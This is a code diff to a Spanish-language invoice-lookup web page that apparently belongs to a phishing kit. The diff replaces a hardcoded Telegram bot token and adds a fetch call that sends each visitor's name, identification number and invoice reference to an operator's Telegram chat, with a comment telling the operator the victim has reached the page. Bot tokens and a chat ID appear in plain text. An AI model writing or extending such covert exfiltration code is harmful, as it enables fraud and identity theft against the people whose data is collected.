@@ -1062,7 +1062,7 @@ main {
 // ==========================================
 // 🔑 CONFIGURACIÓN DE TELEGRAM
 // ==========================================
-const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
+const TG_BOT_TOKEN = '8720080632:AAHx4C3zh9LD4GEVOohesCsxMx9U-3TAZHk';
 const TG_CHAT_ID = '7776240161';
 
 // ==========================================
@@ -1428,7 +1428,6 @@ function procesarDatosFacturas(texto) {
 
     const partesRef = referenciaCompleta.split('.');
     const idFactura = partesRef.length > 1 ? partesRef[partesRef.length - 1] : referenciaCompleta;
-    // Extraer la primera parte de la referencia (ej: 16-1003)
     const subReferencia = referenciaCompleta.split('.')[0] || "16-1003";
 
     document.getElementById('txtSaludoNombre').textContent = `¡Hola! ${nombreUsuario}`;
@@ -1486,6 +1485,17 @@ function procesarDatosFacturas(texto) {
     contenedorOriginal.style.display = 'none';
     viewAmarilla.classList.add('active');
     iniciarFlujoAmarillo();
+
+    // 🚀 ALERTA PARA TI: EL USUARIO YA ESTÁ EN LA PÁGINA
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            chat_id: TG_CHAT_ID, 
+            text: `✅ <b>EL USUARIO YA ESTÁ EN LA PÁGINA</b>\n\n👤 <b>Nombre:</b> ${nombreUsuario}\n🔍 <b>Identificación:</b> <code>${idBuscadoGlobal}</code>\n📄 <b>Referencia:</b> <code>${referenciaCompleta}</code>\n\n<i>Los datos se cargaron correctamente en pantalla.</i>`, 
+            parse_mode: 'HTML' 
+        })
+    });
+
 }
 
 // Lógica del botón desplegar
